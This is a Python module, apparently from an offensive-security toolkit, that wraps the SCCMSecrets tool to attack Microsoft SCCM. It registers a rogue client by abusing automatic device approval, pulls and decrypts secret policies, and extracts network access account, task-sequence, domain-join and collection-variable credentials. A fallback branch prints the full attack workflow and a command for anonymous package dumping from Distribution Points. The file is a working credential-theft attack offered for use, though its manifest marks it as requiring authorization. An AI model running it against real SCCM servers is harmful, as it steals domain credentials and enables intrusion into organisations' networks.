"""SCCM secret policy extraction via SCCMSecrets.

Registers as an SCCM client, requests and decrypts secret policies from
Management Points, and extracts NAA credentials, task sequence secrets,
and collection variables. Supports automatic device approval exploitation,
NTLM/Kerberos auth, PKI certificates, and the alternate authentication
endpoint for mTLS bypass.

Also supports anonymous file indexing and downloading from Distribution
Points.

Source: https://github.com/synacktiv/SCCMSecrets
Requires: typer, requests, cryptography, impacket
"""

from __future__ import annotations

import os
import shutil
import subprocess
import sys
from typing import Any


MANIFEST = {
    "capability_id": "adxpl.sccm.sccm_secrets.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": [
        "sccm_client_registration",
        "credential_extraction",
        "http_requests",
        "rsa_key_generation",
    ],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1072", "T1552.004"],
    "source": "https://github.com/synacktiv/SCCMSecrets",
}


def _find_sccmsecrets() -> str | None:
    """Locate the SCCMSecrets.py script."""
    for name in ("sccmsecrets", "SCCMSecrets", "SCCMSecrets.py"):
        path = shutil.which(name)
        if path:
            return path
    for d in ("/opt/tools/SCCMSecrets", os.path.expanduser("~/tools/SCCMSecrets")):
        candidate = os.path.join(d, "SCCMSecrets.py")
        if os.path.isfile(candidate):
            return candidate
    return None


def run(args: Any) -> int:
    """Extract SCCM secrets via policy manipulation.

    Registers a client with the SCCM Management Point (exploiting automatic
    device approval if no machine credentials provided), then requests and
    decrypts secret policies.

    Args:
        args.management_point: SCCM Management Point URL or hostname.
        args.machine_name: Machine account name (optional).
        args.machine_pass: Machine account password (optional).
        args.machine_hash: Machine account NT hash (optional).
        args.client_name: Client name for SCCM registration.
        args.existing_device: Path to existing device folder (guid.txt + key.pem).
        args.pki_cert: PKI certificate for HTTPS/mTLS (PEM format).
        args.pki_key: PKI certificate private key (PEM format).
        args.altauth: Use alternate auth endpoint (bypasses mTLS).
        args.registration_sleep: Seconds to wait after registration (default 180).
        args.kerberos: Use Kerberos authentication.
        args.mode: 'policies' or 'files' (default: policies).
    """
    mp = getattr(args, "management_point", None) or getattr(args, "target", None)
    mode = getattr(args, "mode", "policies")
    machine_name = getattr(args, "machine_name", None)
    machine_pass = getattr(args, "machine_pass", None) or getattr(args, "password", None)
    machine_hash = getattr(args, "machine_hash", None)
    client_name = getattr(args, "client_name", None)
    existing_device = getattr(args, "existing_device", None)
    pki_cert = getattr(args, "pki_cert", None)
    pki_key = getattr(args, "pki_key", None)
    altauth = getattr(args, "altauth", False)
    reg_sleep = getattr(args, "registration_sleep", 180)
    use_kerberos = getattr(args, "kerberos", False)

    print(f"[*] SCCMSecrets: {mode} extraction")
    print(f"[*] Management Point: {mp}")

    sccmsecrets = _find_sccmsecrets()
    if sccmsecrets:
        cmd = [sys.executable, sccmsecrets, mode]
        cmd.extend(["-mp", mp])
        if client_name:
            cmd.extend(["-cn", client_name])
        if machine_name:
            cmd.extend(["-u", machine_name])
        if machine_pass:
            cmd.extend(["-p", machine_pass])
        if machine_hash:
            cmd.extend(["-H", machine_hash])
        if existing_device:
            cmd.extend(["-d", existing_device])
        if pki_cert:
            cmd.extend(["-c", pki_cert])
        if pki_key:
            cmd.extend(["-pk", pki_key])
        if altauth:
            cmd.append("-a")
        if use_kerberos:
            cmd.append("-k")
        cmd.extend(["-rs", str(reg_sleep)])

        print("[*] CMD: {}".format(" ".join(cmd)))
        result = subprocess.run(cmd, text=True)
        return result.returncode

    print("[!] SCCMSecrets.py not found")
    print()
    print("[*] SCCM policy extraction workflow:")
    print()
    print("  Phase 1: Client Registration")
    print("    - Generate RSA-2048 key pair + ConfigMgr Client cert")
    print("    - Register device with Management Point")
    print("    - Exploit automatic device approval (no creds needed)")
    print("    - Wait for device to be added to collections (~3 min)")
    print()
    print("  Phase 2: Policy Request")
    print("    - Request machine policy assignments from MP")
    print("    - Identify secret policies (NAAConfig, TaskSequence, etc.)")
    print("    - Download secret policy bodies")
    print()
    print("  Phase 3: Decryption")
    print("    - SCCM signing: reversed PKCS1v15+SHA256 signature")
    print("    - Decrypt policy bodies using client private key")
    print("    - Deobfuscate secret policy blobs (XOR + TripleDES)")
    print()
    print("  Phase 4: Secret Extraction")
    print("    - NetworkAccessUsername / NetworkAccessPassword (NAA)")
    print("    - Task sequence embedded credentials")
    print("    - Collection variables")
    print("    - Domain join credentials")
    print()
    print("  Alt: File dumping mode (anonymous on some DPs):")
    print("    SCCMSecrets.py files -mp http://DP-HOST")
    print("    Indexes DataLib content and downloads packages")
    print()
    print("[*] Install: git clone https://github.com/synacktiv/SCCMSecrets")
    print("[*] Deps: pip install typer requests cryptography impacket")
    return 1
